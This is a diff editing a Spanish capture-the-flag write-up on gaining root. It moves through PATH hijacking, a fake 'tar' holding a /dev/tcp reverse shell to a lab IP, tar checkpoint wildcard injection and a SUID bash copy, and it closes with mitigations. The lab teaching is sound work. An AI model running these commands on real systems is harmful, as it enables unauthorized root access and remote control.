@@ -112,36 +112,44 @@ __bss_start
 .gnu.hash
 
 Ahora que hemos visto lo que hace vamos a ver si podemos modificar el $PATH y poner primero la carpeta tmp, para que busque primero los ejecutables en /tmp, antes que en /usr/local/.
-
+```bash
 export PATH=/tmp:$PATH
+```
 
 Comprobamos que el cambio ha sido aceptado.
 ¡Nos deja!
 
 Levantamos un listener en el puerto 442 y preparamos los archivos que aprovecharemos mediante las opciones de tar:
-
+```bash
 touch /home/srv_backup/--checkpoint=1
 touch /home/srv_backup/--checkpoint-action=exec=sh\ run.sh
+```
 
 A continuación, creamos un ejecutable llamado tar dentro de /tmp. De esta forma, debido al orden del $PATH, el sistema utilizará nuestro ejecutable antes que el tar legítimo.
-
+```bash
 cat > tar <<'EOF' #!/bin/sh
 sh -i >& /dev/tcp/172.17.0.1/442 0>&1
 EOF
+```
 
 Le damos permisos de ejecución:
+```bash
 chmod +x /tmp/tar
+```
 
 Creamos el script que copiará /bin/bash a /tmp/rootbash y le asignará el bit SUID:
+```bash
 echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /home/srv_backup/run.sh
+```
 
 Y le damos permisos de ejecución:
 chmod +x /home/srv_backup/run.sh
 
 
 Ahora ejecutamos el binario:
-
+```bash
 /usr/local/bin/backup
+```
 
 El binario vulnerable ejecuta internamente un comando similar a:
 
@@ -155,16 +163,20 @@ El * se expande antes de que tar reciba los argumentos, incluyendo nuestros arch
 Esto provoca que tar ejecute el script run.sh.
 
 Una vez finalizada la ejecución del backup, comprobamos si se ha creado correctamente /tmp/rootbash:
-`ls -l /tmp/rootbash`
+```bash
+ls -l /tmp/rootbash
+```
 
-Si todo ha funcionado correctamente, podremos ejecutar la shell conservando los privilegios:
-`/tmp/rootbash -p`
+Como todo ha funcionado correctamente,  ejecutamos la shell conservando los privilegios:
+```bash
+/tmp/rootbash -p
+```
 
 Con esto obtenemos una shell con privilegios elevados.
 
 <img src="./img/root.png" width="70%">
 
-¡Ya somos **root**! 
+**¡Ya somos root!**
 
 En el fichero flag.txt tenemos la flag. 🚩
 
@@ -175,6 +187,13 @@ Para finalizar, vamos a nuestra terminal y ponemos la flag completa.
 ---
 
 ## 🏁 4. Conclusiones y Mitigación
-* **Vulnerabilidad Principal**: Falta de sanitización en los parámetros web de entrada / Binarios con permisos SUDO mal configurados.
-* **Remediación**: Actualizar los servicios vulnerables, implementar *whitelisting* en los inputs y aplicar el principio de menor privilegio retirando accesos SUDO innecesarios.
+* **Vulnerabilidad Principal**: Credenciales almacenadas en texto plano dentro de un archivo Python, permitiendo su extracción y posterior acceso no autorizado. / Binarios con permisos SUDO mal configurados.
+* **Remediación**: No almacenar credenciales directamente en el código. Utilizar variables de entorno o un gestor de secretos, aplicar el principio de mínimo privilegio y revisar periódicamente los permisos y credenciales utilizadas.
+### Mitigación
+* Usar rutas absolutas para ejecutar comandos.
+* No confiar en variables de entorno controlables por el usuario.
+* Evitar comodines sobre archivos controlados por usuarios.
+* Ejecutar el backup con el mínimo privilegio necesario.
+* Revisar los permisos de archivos y directorios.
+
 
